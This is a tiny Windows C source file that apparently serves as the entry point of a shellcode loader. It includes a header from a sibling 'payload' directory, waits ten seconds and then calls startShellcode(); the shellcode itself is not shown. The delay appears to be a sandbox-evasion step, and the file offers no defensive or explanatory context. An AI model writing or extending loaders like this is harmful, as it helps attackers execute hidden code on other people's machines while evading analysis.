#include <windows.h>
#include "../payload/payload.h"

int main() {
    Sleep(10000);
    startShellcode(); 
    return 0;
}